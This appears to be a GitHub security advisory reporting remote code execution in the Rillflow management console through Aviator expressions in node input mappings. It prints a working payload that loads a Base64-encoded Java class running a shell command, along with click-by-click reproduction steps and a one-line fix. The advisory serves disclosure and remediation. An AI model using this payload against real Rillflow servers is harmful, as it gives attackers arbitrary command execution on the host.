### Summary

In the Rillflow management console, attackers can create a process list and set input mappings for nodes to process Aviator expressions, which can lead to Remote Code Execution (RCE). This allows them to escalate from a web user to gain machine privileges. 

JDK17's rillfow payload
```
use org.springframework.cglib.core.*;use org.springframework.util.*;use java.security.*;ReflectUtils.defineClass('org.springframework.expression.Test', Base64Utils.decodeFromString('yv66vgAAADQALAoACgAUCQAVABYIABcKABgAGQoAGgAbCAAcCgAaAB0HAB4HAB8HACABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAeAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACwAMBwAhDAAiACMBAAtzdGF0aWMgRXhlYwcAJAwAJQAmBwAnDAAoACkBABB0b3VjaCAvdG1wL3B3bmVkDAAqACsBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAjb3JnL3NwcmluZ2ZyYW1ld29yay9leHByZXNzaW9uL1Rlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAkACgAAAAAAAgABAAsADAABAA0AAAAhAAEAAQAAAAUqtwABsQAAAAEADgAAAAoAAgAAAAQABAAFAAgADwAMAAEADQAAAFMAAgABAAAAFrIAAhIDtgAEuAAFEga2AAdXpwAES7EAAQAAABEAFAAIAAIADgAAABYABQAAAAkACAAKABEADAAUAAsAFQAOABAAAAAHAAJUBwARAAABABIAAAACABM'), ClassLoader.getSystemClassLoader(), nil, Class.forName('org.springframework.expression.ExpressionParser'));
```
### Impact 
Rillflow *

### Proof of Concept1 
1.Create a process list, click Create
![image](https://github.com/user-attachments/assets/35225dc5-0437-49fe-aa4e-1a664b5fff8e)

2. import demo file 
```
version: 1.0.0
workspace: rillFlowSimple
dagName: greet
alias: release
type: flow
inputSchema: >-
  [{"required":true,"name":"Bob","type":"String"},{"required":true,"name":"Alice","type":"String"}]
tasks:
  - category: function
    name: Bob
    resourceName: http://sample-executor:8000/greet.json?user=Bob
    pattern: task_sync
    tolerance: false
    next: Alice
    inputMappings:
      - source: "$.context.Bob"
        target: "$.input.Bob"
  - category: function
    name: Alice
    resourceName: http://sample-executor:8000/greet.json?user=Alice
    pattern: task_sync
    tolerance: false
    inputMappings:
      - source: "$.context.Alice"
        target: "$.input.Alice"
```
![image](https://github.com/user-attachments/assets/569d9a23-457a-46a6-a21a-2714063ee85f)

3. Click Bob Input payload
```
use org.springframework.cglib.core.*;use org.springframework.util.*;use java.security.*;ReflectUtils.defineClass('org.springframework.expression.Test', Base64Utils.decodeFromString('yv66vgAAADQALAoACgAUCQAVABYIABcKABgAGQoAGgAbCAAcCgAaAB0HAB4HAB8HACABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAeAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACwAMBwAhDAAiACMBAAtzdGF0aWMgRXhlYwcAJAwAJQAmBwAnDAAoACkBABB0b3VjaCAvdG1wL3B3bmVkDAAqACsBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAjb3JnL3NwcmluZ2ZyYW1ld29yay9leHByZXNzaW9uL1Rlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAkACgAAAAAAAgABAAsADAABAA0AAAAhAAEAAQAAAAUqtwABsQAAAAEADgAAAAoAAgAAAAQABAAFAAgADwAMAAEADQAAAFMAAgABAAAAFrIAAhIDtgAEuAAFEga2AAdXpwAES7EAAQAAABEAFAAIAAIADgAAABYABQAAAAkACAAKABEADAAUAAsAFQAOABAAAAAHAAJUBwARAAABABIAAAACABM'), ClassLoader.getSystemClassLoader(), nil, Class.forName('org.springframework.expression.ExpressionParser'));
```
![image](https://github.com/user-attachments/assets/f653663b-4e6e-47c1-89e1-466764e1f566)

Then click ok  
4. Click save then set alias name  
![image](https://github.com/user-attachments/assets/30a08f4c-4a26-4f4a-b2e0-2021866bc86c)

5. Click next Step，click Submit
![image](https://github.com/user-attachments/assets/edb8dfbb-8fda-48bc-a6de-69ed4a13ef99)

6. Click Test Run，Input some args，execute command
![image](https://github.com/user-attachments/assets/4e1a07cc-ff1c-4846-99a5-58a34fdc7773)
![image](https://github.com/user-attachments/assets/38f56ace-e791-4c14-a593-328b775a340f)



### How to Fix It
When using Aviator, add relevant configurations to it to prohibit the loading of external classes.
https://www.yuque.com/boyan-avfmj/aviatorscript/yr1oau
Simply set the classes in the whitelist to empty.
